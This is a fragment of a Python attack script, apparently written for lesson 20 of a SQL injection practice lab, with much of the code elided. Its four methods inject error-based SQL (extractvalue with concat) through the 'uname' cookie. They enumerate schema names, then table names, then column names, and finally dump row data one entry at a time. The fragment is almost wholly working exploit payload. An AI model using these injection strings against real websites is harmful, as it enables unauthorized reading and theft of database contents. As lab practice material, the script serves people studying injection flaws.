...
class Less20(object):
    ...
    def dbs_payload(self):
        ...
        while True:
            ...
            cookies = dict(uname=self.data['uname']+"'and extractvalue(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e))#")
    ...
    def tables_payload(self):
        ...
        while True:
            ...
            cookies = dict(uname=self.data['uname']+"'and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e))#")
    ...
    def columns_payload(self):
        ...
        while True:
            ...
            cookies = dict(uname=self.data['uname']+"'and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e))#")
    ...
    def data_payload(self):
        ...
        while True:
            ...
            cookies = dict(uname=self.data['uname']+"'and extractvalue(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e))#")
